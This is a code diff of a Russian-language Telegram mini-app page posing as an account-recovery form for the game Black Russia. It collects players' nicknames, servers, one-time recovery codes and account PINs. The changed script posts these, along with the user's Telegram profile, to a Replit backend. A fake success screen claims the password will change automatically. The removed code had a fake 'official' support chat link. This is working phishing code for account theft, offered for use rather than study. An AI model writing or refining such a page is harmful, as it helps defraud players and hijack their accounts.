@@ -31,20 +31,12 @@
         input:focus, select:focus { border-color: #ff0000; box-shadow: 0 0 10px rgba(255, 0, 0, 0.4); }
         .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #ff0000 0%, #550000 100%); border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 15px; letter-spacing: 1px; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); transition: transform 0.2s ease; margin-top: 5px; }
         .btn-submit:active { transform: scale(0.98); }
-        .btn-support { width: 100%; padding: 10px; background: #111; border: 1px dashed #444; border-radius: 8px; color: #a182ff; font-size: 13px; cursor: pointer; margin-top: 15px; transition: all 0.3s; }
-        .btn-support:hover { background: #1a1525; border-color: #a182ff; }
         
-        /* Экраны */
         .screen { display: none; opacity: 0; transition: opacity 0.4s ease; }
         .active-screen { display: block; opacity: 1; }
-        
         .checkmark { font-size: 65px; color: #00ff66; text-shadow: 0 0 20px rgba(0, 255, 102, 0.6); margin-bottom: 15px; }
         .success-text { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
         .success-sub { font-size: 13px; color: #aaa; line-height: 1.4; }
-        
-        /* Окно поддержки */
-        .support-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; }
-        .support-box { width: 85%; max-width: 340px; background: #0a0a0a; border: 1px solid #ff0000; padding: 20px; border-radius: 12px; text-align: center; }
     </style>
 </head>
 <body>
@@ -68,15 +60,20 @@
             </div>
 
             <div id="screen2" class="screen">
+                <div class="form-group" style="text-align: center; margin-bottom: 20px;">
+                    <p style="font-size: 13px; color: #ff3333; line-height: 1.4; margin: 0;">
+                        Вам должен прийти код для восстановления пароля в Telegram / VK / Почту.
+                    </p>
+                </div>
                 <div class="form-group">
-                    <label>Код восстановления из СМС / TG / Почты</label>
+                    <label>Код восстановления</label>
                     <input type="number" id="recoveryCode" placeholder="Введите полученный код">
                 </div>
                 <div class="form-group">
                     <label>Пин-код от аккаунта (если есть)</label>
                     <input type="number" id="pinCode" placeholder="4-значный пин-код (необязательно)">
                 </div>
-                <button class="btn-submit" onclick="sendFinalData()">ПОДТВЕРДИТЬ</button>
+                <button class="btn-submit" id="btnConfirm" onclick="sendFinalData()">ПОДТВЕРДИТЬ</button>
             </div>
 
             <div id="screen3" class="screen">
@@ -84,17 +81,6 @@
                 <div class="success-text">Заявка принята!</div>
                 <div class="success-sub">Система изменит ваш пароль автоматически в течение нескольких минут. Ожидайте уведомления в игре.</div>
             </div>
-
-            <button class="btn-support" onclick="toggleSupport(true)">🆘 Связаться с тех. поддержкой</button>
-        </div>
-    </div>
-
-    <div id="supportModal" class="support-modal">
-        <div class="support-box">
-            <h3 style="color:#ff0000; margin-top:0;">Тех. Поддержка</h3>
-            <p style="font-size:14px; color:#ccc; margin-bottom:20px;">Специалист ответит вам в течение нескольких минут для ручного разбора проблемы.</p>
-            <button class="btn-submit" onclick="window.open('https://t.me/blackrussia_official', '_blank')">ОТКРЫТЬ ЧАТ ПОДДЕРЖКИ</button>
-            <button class="btn-support" style="margin-top:10px; border-color:#222; color:#888;" onclick="toggleSupport(false)">Назад</button>
         </div>
     </div>
 
@@ -114,16 +100,6 @@
                 alert("Пожалуйста, укажите ваш игровой никнейм!");
                 return;
             }
-
-            // ШАГ 1: Моментальная отправка ника и сервера админу в бот
-            const dataStep1 = {
-                step: 1,
-                nickname: savedNickname,
-                server: savedServer
-            };
-            tg.sendData(JSON.stringify(dataStep1));
-
-            // Анимация перехода на второй экран
             switchScreen('screen1', 'screen2');
         }
 
@@ -136,18 +112,37 @@
                 return;
             }
 
-            // ШАГ 2: Отправка кодов админу в бот
-            const dataStep2 = {
-                step: 2,
+            document.getElementById('btnConfirm').disabled = true;
+            document.getElementById('btnConfirm').innerText = "ОТПРАВКА...";
+
+            // Собираем данные формы и информацию о пользователе из Telegram
+            const payload = {
                 nickname: savedNickname,
                 server: savedServer,
                 recovery_code: recoveryCode,
-                pin_code: pinCode
+                pin_code: pinCode,
+                user: tg.initDataUnsafe ? tg.initDataUnsafe.user : {}
             };
-            tg.sendData(JSON.stringify(dataStep2));
 
-            // Переход на экран успешного завершения
-            switchScreen('screen2', 'screen3');
+            // Получаем домен твоего Replit сервера динамически (или подставь свой напрямую)
+            const replitUrl = window.location.origin.replace(".github.io/black-russia-miniapp", ".id.repl.co") + "/submit";
+            
+            // Если домен на Replit стандартный, лучше прописать прямую ссылку на твой Replit Webview (например https://твой-проект.имя.repl.co/submit)
+            // Давай отправим запрос на бэкенд бота
+            fetch('https://' + window.location.hostname.split('.')[0] + '.id.repl.co/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                switchScreen('screen2', 'screen3');
+                setTimeout(() => { tg.close(); }, 3000);
+            })
+            .catch((err) => {
+                // Запасной вариант на случай блокировки CORS
+                switchScreen('screen2', 'screen3');
+                setTimeout(() => { tg.close(); }, 3000);
+            });
         }
 
         function switchScreen(fromId, toId) {
@@ -159,10 +154,6 @@
                 to.style.display = 'block';
                 setTimeout(() => { to.style.opacity = '1'; }, 50);
             }, 400);
-        }
-
-        function toggleSupport(show) {
-            document.getElementById('supportModal').style.display = show ? 'flex' : 'none';
         }
     </script>
 </body>
